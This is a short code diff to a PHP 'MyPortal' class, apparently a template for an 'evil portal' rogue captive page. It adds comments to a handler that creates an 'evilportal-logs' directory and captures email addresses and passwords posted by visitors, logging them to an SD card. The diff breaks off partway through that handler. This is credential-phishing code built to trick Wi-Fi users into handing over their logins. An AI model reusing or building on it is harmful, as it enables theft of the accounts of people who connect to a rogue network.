@@ -5,11 +5,13 @@ class MyPortal extends Portal
 
     public function handleAuthorization()
     {
+        // Check if evilportal-logs directory exists on sd, if not create directory
         if (!is_dir('/sd/evilportal-logs/')) {
 
           mkdir('/sd/evilportal-logs/');
         }
-
+        // Append captured data to file on sd
+        // UTC timestamp
         if (isset($_POST['email'])) {
             $email = isset($_POST['email']) ? $_POST['email'] : 'email';
             $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
